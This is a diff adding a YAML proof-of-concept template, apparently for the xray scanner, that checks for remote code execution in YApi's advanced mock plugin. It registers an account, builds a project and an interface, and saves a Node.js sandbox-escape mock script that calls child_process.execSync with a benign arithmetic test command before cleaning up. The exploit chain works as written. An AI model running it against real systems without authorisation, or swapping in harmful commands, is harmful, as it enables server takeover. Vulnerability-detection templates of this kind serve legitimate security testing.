@@ -1,0 +1,81 @@
+name: poc-yaml-yapi-mock-rce
+manual: true
+transport: http
+set:
+  s1: randomLowercase(5)
+  a1: randomInt(800000000, 1000000000)
+  a2: randomInt(800000000, 1000000000)
+rules:
+    r0:
+      request:
+        method: POST
+        path: '/api/user/reg'
+        headers:
+          Content-Type: application/json
+        body: '{"email":"{{s1}}@{{s1}}.{{s1}}","password":"{{s1}}","username":"{{s1}}"}'
+      expression: response.status == 200 
+    r1: 
+      request:
+        method: GET
+        path: '/api/group/get_mygroup'
+      expression: response.status == 200
+      output:
+        search: '"\"private\",\"_id\":(?P<id>.+?),\"group_name\"".bsubmatch(response.body)'
+        id: search["id"]
+    r2:
+      request:
+        method: POST
+        path: '/api/project/add'
+        headers:
+          Content-Type: application/json
+        body: '{"name":"{{s1}}","group_id":"{{id}}","icon":"code-o","color":"purple","project_type":"private"}'
+      expression: response.status == 200 && response.body.bcontains(b"\"errcode\":0,")
+      output:
+        search: '"tag\":\\[],\"_id\":(?P<project_id>.+?),\"__v\"".bsubmatch(response.body)'
+        project_id: search["project_id"]
+    r3:
+      request:
+        method: GET
+        path: '/api/project/get?id={{project_id}}'
+      expression: response.status == 200 && response.body.bcontains(b"\"errcode\":0,")
+      output:
+        search: '"\"tag\":\\[],\"cat\":\\[{\"index\":0,\"_id\":(?P<catid>.+?),\"name\"".bsubmatch(response.body)'
+        catid: search["catid"]
+    r4:
+      request:
+        method: POST
+        path: '/api/interface/add'
+        headers:
+          Content-Type: application/json
+        body: '{"method":"GET","catid":"{{catid}}","title":"{{s1}}","path":"/{{s1}}","project_id":"{{project_id}}"}'
+      expression: response.status == 200 && response.body.bcontains(b"\"errcode\":0,")
+      output:
+        search: '"\"req_body_form\":\\[],\"_id\":(?P<interface_id>.+?),\"__v\"".bsubmatch(response.body)'
+        interface_id: search["interface_id"]
+    r5:
+      request:
+        method: POST
+        path: '/api/plugin/advmock/save'
+        headers:
+          Content-Type: application/json
+        body: '{"project_id":"{{project_id}}","interface_id":"{{interface_id}}","mock_script":"const sandbox = this\r\nconst ObjectConstructor = this.constructor\r\nconst FunctionConstructor = ObjectConstructor.constructor\r\nconst myfun = FunctionConstructor(\"return process\")\r\nconst process = myfun()\r\nmockJson = process.mainModule.require(\"child_process\").execSync(\"expr {{a1}} + {{a2}}\").toString()","enable":true}'        
+      expression: response.status == 200 && response.body.bcontains(b"\"errcode\":0,")
+    r6:
+      request:
+        method: GET
+        path: '/mock/{{project_id}}/{{s1}}'
+      expression: response.status == 200 && response.body.bcontains(bytes(string(a1+a2)))
+    r7:
+      request:
+        method: POST
+        path: '/api/interface/del'
+        headers:
+          Content-Type: application/json
+        body: '{"id":{{interface_id}}}'
+      expression: response.status == 200 
+
+expression: r0() && r1() && r2() && r3() && r4() && r5() && r6() && r7() 
+detail:
+    author: Jarcis-cy(https://github.com/jarcis-cy)
+    links:
+        - https://github.com/vulhub/vulhub/blob/master/yapi/unacc/README.md
